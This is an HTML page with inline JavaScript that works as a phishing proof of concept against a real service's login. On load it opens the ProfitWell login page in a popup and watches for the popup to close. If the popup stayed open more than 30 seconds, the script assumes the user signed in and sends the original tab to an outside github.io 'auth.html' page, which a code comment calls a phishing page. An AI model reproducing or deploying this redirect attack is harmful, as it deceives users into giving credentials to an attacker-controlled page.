<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monitor Child Window</title>
    <script>
        function monitorChildWindow(childWindow) {
            console.log("Monitoring child window...");

            const checkInterval = setInterval(() => {
                // Check if the child window is closed
                if (childWindow.closed) {
                    console.log("Child window has been closed!");

                    // Assume the window was closed after login if it stays open for a reasonable time
                    const elapsedTime = Date.now() - childWindow.startTime;
                    if (elapsedTime > 30000) { // Example: 30 seconds threshold
                        console.log("Login likely completed, redirecting user...");
                        // Redirect user to phishing page or take any malicious action
                        window.location.href = "https://du4l5ynche1n.github.io/missing-coop/auth.html";
                    } else {
                        console.log("Window was closed too quickly, likely no login happened.");
                    }

                    clearInterval(checkInterval); // Stop monitoring
                }
            }, 500); // Check every half-second
        }

        function initialize() {
            // Open the target site's login page in a child window
            const childWindow = window.open(
                "https://www2.profitwell.com/acc/login", 
                "popup", 
                ""
            );

            if (!childWindow) {
                console.error("Failed to open the child window. Pop-up blocker might be active.");
                return;
            }

            console.log("Child window opened for login.");
            
            // Add a custom property to track when the child window opened
            childWindow.startTime = Date.now();

            // Start monitoring the child window
            monitorChildWindow(childWindow);
        }

        window.onload = initialize;
    </script>
</head>
<body>
    <h1>Monitor Child Window Closure</h1>
    <p>The child window will be monitored for login activity by observing closure events.</p>
</body>
</html>
